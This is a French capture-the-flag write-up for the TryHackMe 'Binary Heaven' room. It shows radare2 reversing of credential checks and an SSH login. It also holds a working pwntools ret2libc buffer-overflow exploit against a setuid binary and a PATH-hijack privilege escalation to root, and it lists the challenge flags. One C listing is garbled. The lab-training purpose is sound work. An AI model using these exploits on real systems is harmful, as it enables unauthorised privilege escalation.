# Binary Heaven #

## Task 2 Being worthy ##

```bash
tim@kali:~/Bureau/tryhackme/write-up$ unzip credentials.zip 
Archive:  credentials.zip
  inflating: angel_A                 
  inflating: angel_B     
```

On décompresse les fichiers.  

**What is the username?**

```bash
tim@kali:~/Bureau/tryhackme/write-up$ radare2 angel_A 
Warning: run r2 with -e io.cache=true to fix relocations in disassembly
[0x00001090]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x00001090]> afl
0x00001090    1 42           entry0
0x000010c0    4 41   -> 34   sym.deregister_tm_clones
0x000010f0    4 57   -> 51   sym.register_tm_clones
0x00001130    5 57   -> 50   sym.__do_global_dtors_aux
0x00001080    1 6            sym.imp.__cxa_finalize
0x00001170    1 5            entry.init0
0x00001000    3 23           sym._init
0x000012c0    1 1            sym.__libc_csu_fini
0x000012c4    1 9            sym._fini
0x00001260    4 93           sym.__libc_csu_init
0x00001175    8 225          main
0x00001060    1 6            sym.imp.ptrace
0x00001040    1 6            sym.imp.printf
0x00001070    1 6            sym.imp.exit
0x00001050    1 6            sym.imp.fgets
0x00001030    1 6            sym.imp.puts
[0x00001090]> pdf @main
            ; DATA XREF from entry0 @ 0x10ad
┌ 225: int main (int argc, char **argv);
│           ; var char **var_20h @ rbp-0x20
│           ; var int64_t var_14h @ rbp-0x14
│           ; var char *s @ rbp-0xd
│           ; var signed int64_t var_4h @ rbp-0x4
│           ; arg int argc @ rdi
│           ; arg char **argv @ rsi
│           0x00001175      55             push rbp
│           0x00001176      4889e5         mov rbp, rsp
│           0x00001179      4883ec20       sub rsp, 0x20
│           0x0000117d      897dec         mov dword [var_14h], edi    ; argc
│           0x00001180      488975e0       mov qword [var_20h], rsi    ; argv
│           0x00001184      b900000000     mov ecx, 0                  ; void*data
│           0x00001189      ba01000000     mov edx, 1                  ; void*addr
│           0x0000118e      be00000000     mov esi, 0                  ; pid_t pid
│           0x00001193      bf00000000     mov edi, 0                  ; __ptrace_request request
│           0x00001198      b800000000     mov eax, 0
│           0x0000119d      e8befeffff     call sym.imp.ptrace         ; long ptrace(__ptrace_request request, pid_t pid, void*addr, void*data)
│           0x000011a2      4883f8ff       cmp rax, 0xffffffffffffffff
│       ┌─< 0x000011a6      751b           jne 0x11c3
│       │   0x000011a8      488d3d590e00.  lea rdi, str.Using_debuggers__Here_is_tutorial_https:__www.youtube.com_watch_vdQw4w9WgXcQ_n_22 ; 0x2008 ; "Using debuggers? Here is tutorial https://www.youtube.com/watch?v=dQw4w9WgXcQ/n%22" ; const char *format
│       │   0x000011af      b800000000     mov eax, 0
│       │   0x000011b4      e887feffff     call sym.imp.printf         ; int printf(const char *format)
│       │   0x000011b9      bf01000000     mov edi, 1                  ; int status
│       │   0x000011be      e8adfeffff     call sym.imp.exit           ; void exit(int status)
│       │   ; CODE XREF from main @ 0x11a6
│       └─> 0x000011c3      488d3d910e00.  lea rdi, str.e_36m_nSay_my_username____e_0m ; 0x205b ; const char *format
│           0x000011ca      b800000000     mov eax, 0
│           0x000011cf      e86cfeffff     call sym.imp.printf         ; int printf(const char *format)
│           0x000011d4      488b15a52e00.  mov rdx, qword [obj.stdin]  ; obj.__TMC_END__
│                                                                      ; [0x4080:8]=0 ; FILE *stream
│           0x000011db      488d45f3       lea rax, [s]
│           0x000011df      be09000000     mov esi, 9                  ; int size
│           0x000011e4      4889c7         mov rdi, rax                ; char *s
│           0x000011e7      e864feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           0x000011ec      c745fc000000.  mov dword [var_4h], 0
│       ┌─< 0x000011f3      eb48           jmp 0x123d
│       │   ; CODE XREF from main @ 0x1241
│      ┌──> 0x000011f5      8b45fc         mov eax, dword [var_4h]
│      ╎│   0x000011f8      4898           cdqe
│      ╎│   0x000011fa      488d14850000.  lea rdx, [rax*4]
│      ╎│   0x00001202      488d05572e00.  lea rax, obj.username       ; 0x4060 ; U"kym~humr"
│      ╎│   0x00001209      8b1402         mov edx, dword [rdx + rax]
│      ╎│   0x0000120c      8b45fc         mov eax, dword [var_4h]
│      ╎│   0x0000120f      4898           cdqe
│      ╎│   0x00001211      0fb64405f3     movzx eax, byte [rbp + rax - 0xd]
│      ╎│   0x00001216      83f004         xor eax, 4
│      ╎│   0x00001219      0fbec0         movsx eax, al
│      ╎│   0x0000121c      83c008         add eax, 8
│      ╎│   0x0000121f      39c2           cmp edx, eax
│     ┌───< 0x00001221      7416           je 0x1239
│     │╎│   0x00001223      488d3d560e00.  lea rdi, str.e_31m_nThat_is_not_my_username_e_0m ; 0x2080 ; const char *s
│     │╎│   0x0000122a      e801feffff     call sym.imp.puts           ; int puts(const char *s)
│     │╎│   0x0000122f      bf00000000     mov edi, 0                  ; int status
│     │╎│   0x00001234      e837feffff     call sym.imp.exit           ; void exit(int status)
│     │╎│   ; CODE XREF from main @ 0x1221
│     └───> 0x00001239      8345fc01       add dword [var_4h], 1
│      ╎│   ; CODE XREF from main @ 0x11f3
│      ╎└─> 0x0000123d      837dfc07       cmp dword [var_4h], 7
│      └──< 0x00001241      7eb2           jle 0x11f5
│           0x00001243      488d3d5e0e00.  lea rdi, str.e_32m_nCorrect__That_is_my_name_e_0m ; 0x20a8 ; const char *s
│           0x0000124a      e8e1fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0000124f      b800000000     mov eax, 0
│           0x00001254      c9             leave
└           0x00001255      c3             ret

```

On désassemble le fichier avec radare2.
On remarque que dans le fichier la chaîne "kym~humr".  
On voit que le programme fait un xor 4 sur chaque lettre puis lui additionne 8.

```cpp
tim@kali:~/Bureau/tryhackme/write-up$ cat decode.c 
#include <stdio.h>

What is the password?

	char name[]="kym~humr";

	for(int i=0;i<strlen(name);i++)
	{
		printf("%c", ((name[i])^4)-8);
	}
	return 0;
}
```

On fabrique un petit programme qui fait l'opération xor 4 et ajoute 8.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ gcc decode.c 
tim@kali:~/Bureau/tryhackme/write-up$ ./a.out 
guardian

tim@kali:~/Bureau/tryhackme/write-up$ ./angel_A

Say my username >> guardian

Correct! That is my name!
```

On compile le programme.
On exécute le programme et on trouve le nom qui est guardian.
On vérifie si c'est bon.  

**What is the password?**

```bash
tim@kali:~/Bureau/tryhackme/write-up$ radare2 angel_B 
[0x00464700]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Find function and symbol names from golang binaries (aang)
[x] Found 1860 symbols and saved them at sym.go.*
[x] Analyze all flags starting with sym.go. (aF @@ sym.go.*)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.

[0x00464700]> afl | grep main
0x004347c0   31 875          sym.runtime.main
0x0045d240    3 80           sym.runtime.main.func1
0x0045d2a0    5 60           sym.runtime.main.func2
0x004a52c0    7 682  -> 678  sym.main.main

[0x00464700]> pdf @sym.main.main
...
  ╎╎││╎   0x004a5499      4881c4c00000.  add rsp, 0xc0
│   ╎╎││╎   0x004a54a0      c3             ret
│   ╎╎││╎   ; CODE XREF from sym.main.main @ 0x4a5404
│   ╎╎└───> 0x004a54a1      48890424       mov qword [rsp], rax
│   ╎╎ │╎   0x004a54a5      488d055f5802.  lea rax, [0x004cad0b]       ; "GOg0esGrrr!IdeographicMedefaidrinNandinagariNew_Tai_LueOld_PersianOld_SogdianPau_Cin_HauSignWritingSoft_DottedWarang_CitiWhite_"
│   ╎╎ │╎   0x004a54ac      4889442408     mov qword [var_8h], rax
│   ╎╎ │╎   0x004a54b1      48894c2410     mov qword [var_10h], rcx
...

tim@kali:~/Bureau/tryhackme/write-up$ ./angel_B
 
Say the magic word >> 
GOg0esGrrr!
 
Right password! Now GO ahead and SSH into heaven.
```

On le désassemble avec radar2.
Dans la fonction sym.main.main on trouve un longue chaîne, le début de la chaîte c'est le mot de passe.   
Le mot de passe est : GOg0esGrrr!   
On le vérifie c'est le bon.   

**What is the flag?**

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.47.166 heaven.thm' >> /etc/hosts"
[sudo] Mot de passe de tim : 

tim@kali:~/Bureau/tryhackme/write-up$ ssh guardian@heaven.thm
The authenticity of host 'heaven.thm (10.10.47.166)' can't be established.
ECDSA key fingerprint is SHA256:QQw//8JItbQzRO+P8EOMPLuJMRUZ92jc4IK9CMPSEdU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'heaven.thm,10.10.47.166' (ECDSA) to the list of known hosts.
guardian@heaven.thm's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

84 packages can be updated.
2 updates are security updates.

Last login: Mon Mar  1 22:38:24 2021 from 127.0.0.1
guardian@heaven:~$ id
uid=1001(guardian) gid=1001(guardian) groups=1001(guardian)
guardian@heaven:~$ ls
guardian_flag.txt  pwn_me
guardian@heaven:~$ cat guardian_flag.txt 
THM{crack3d_th3_gu4rd1an}
```

On se connecte au service SSH, on trouve le fichier guardian_flag.txt on le lit.   
Le flag est : THM{crack3d_th3_gu4rd1an}  

## Task 3 Return to the origins ##

**binexgod_flag.txt**

```bash
uardian_flag.txt  pwn_me
guardian@heaven:~$ ls -al pwn_me
-rwsr-sr-x 1 binexgod binexgod 15772 May  8 08:58 pwn_me

guardian@heaven:~$ ./pwn_me
Binexgod said he want to make this easy.
System is at: 0xf7d65950
```

On trouve un fichier setuid, quand on l'exécute il affiche une adresse. 

```bash
guardian@heaven:~$ python -c 'print("A"*100)' | ./pwn_me
Binexgod said he want to make this easy.
System is at: 0xf7dd7950
Segmentation fault (core dumped)
```

Quand on lui envoie une grande chaîne de caractère le programme plante il doit avoir un buffer overflow.  

```bash
guardian@heaven:~$ echo "never" > /home/guardian/.cache/.pwntools-cache-3.5/update 
guardian@heaven:~$ cyclic 100 > /tmp/fuzz
guardian@heaven:~$ gdb ./pwn_me -q
Reading symbols from ./pwn_me...(no debugging symbols found)...done.
(gdb) r pwn_me < /tmp/fuzz
Starting program: /home/guardian/pwn_me pwn_me < /tmp/fuzz
Binexgod said he want to make this easy.
System is at: 0xf7d5f950

Program received signal SIGSEGV, Segmentation fault.
0x61616169 in ?? ()
(gdb) quit
A debugging session is active.

	Inferior 1 [process 2040] will be killed.

Quit anyway? (y or n) y
guardian@heaven:~$ cyclic -l 0x61616169
32
```

On regarde partire de ou le programme plante.  
Cyclic nous permet de trouver on ça plante.  
On trouve un décalage de 32 pour aller à la bonne adresse.  

```python
guardian@heaven:~$ cat exploit.py 
from pwn import *

elf = context.binary = ELF('./pwn_me')
libc = elf.libc
p = process()

#get the leaked address
p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

#set our libc address according to the leaked address
libc.address = system_leak - libc.sym['system']
log.success('LIBC base: {}'.format(hex(libc.address)))

#get location of /bin/sh from libc
binsh = next(libc.search(b'/bin/sh'))

#build the rop chain
rop = ROP(libc)
rop.raw('A' * 32)
rop.system(binsh)

#send our rop chain
p.sendline(rop.chain())

#Get the shell
p.interactive()
```

On crée notre exploit qui va exécuter notre shell, la valeur que on a trouvée est la valeur rop.  

```bash
guardian@heaven:~$ python exploit.py 
[*] '/home/guardian/pwn_me'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/lib32/libc-2.23.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/home/guardian/pwn_me': pid 2068
[+] LIBC base: 0xf7d37000
[*] Loading gadgets for '/lib32/libc-2.23.so'
[*] Switching to interactive mode

$ id
uid=1002(binexgod) gid=1001(guardian) groups=1001(guardian)

$ cd /home/binexgod
$ cat binexgod_flag.txt
THM{b1n3xg0d_pwn3d}

```

Graçe à notre exploit on a les droits de binexgod.  
On lit le fichier binexgod_flag.txt dans le répertoire /home/binexgod/.   
On obtient le flag.   
Le flag est : THM{b1n3xg0d_pwn3d}   

## Task 4 PATH to root ##

**root.txt**   

```bash
$ cat vuln.c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo Get out of heaven lol");
}
```

On regarde le fichier il exécute env et echo.  
On peut usurper echo.  

```bash
$ echo '/bin/bash -p' > /tmp/echo
$ chmod +x /tmp/echo
$ export PATH=/tmp:$PATH
$ ./vuln
$ id
uid=0(root) gid=1001(guardian) groups=1001(guardian)
```

On crée notre fuax echo dans tmp.  
On le rend exécutable.  
On dit de chercher echo dans tmp.  
On exécute vuln et on a l'uid root.  

```bash
$ cat /root/root.txt
THM{r00t_of_th3_he4v3n}
```

On lit le fichier root.txt dans le répertoire root.   
Le flag est : THM{r00t_of_th3_he4v3n}    
